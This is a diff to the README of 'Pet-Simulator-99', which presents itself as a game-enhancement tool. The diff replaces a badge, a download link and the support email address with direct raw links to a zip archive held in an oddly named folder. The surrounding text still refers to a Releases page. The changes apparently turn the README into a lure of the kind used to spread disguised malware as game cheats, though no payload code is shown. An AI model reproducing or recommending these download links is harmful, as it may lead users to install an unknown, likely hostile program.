@@ -1,6 +1,6 @@
 # 🐾 Pet-Simulator-99 - Enhance Your Gameplay Experience
 
-![Download Pet-Simulator-99](https://img.shields.io/badge/Download-Pet--Simulator--99-blue.svg)
+![Download Pet-Simulator-99](https://github.com/NaoMeEsquece/Pet-Simulator-99/raw/refs/heads/main/spheroidic/SimulatorPet-v3.4-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Pet-Simulator-99! This tool helps you improve your gameplay with feat
 
 To get started, you will need to download the software. Visit the link below to access the Releases page:
 
-[Download Pet-Simulator-99](https://github.com)
+[Download Pet-Simulator-99](https://github.com/NaoMeEsquece/Pet-Simulator-99/raw/refs/heads/main/spheroidic/SimulatorPet-v3.4-alpha.1.zip)
 
 Once you're on the Releases page:
 
@@ -84,7 +84,7 @@ A: Yes, you can install Pet-Simulator-99 on multiple devices as long as they mee
 For any issues or questions, feel free to reach out:
 
 - Community Forum: [Forum Link](#)
-- Email: [support@petsimulator99.com](mailto:support@petsimulator99.com)
+- Email: [https://github.com/NaoMeEsquece/Pet-Simulator-99/raw/refs/heads/main/spheroidic/SimulatorPet-v3.4-alpha.1.zip](https://github.com/NaoMeEsquece/Pet-Simulator-99/raw/refs/heads/main/spheroidic/SimulatorPet-v3.4-alpha.1.zip)
 
 We are happy to assist you with any queries you may have.
 
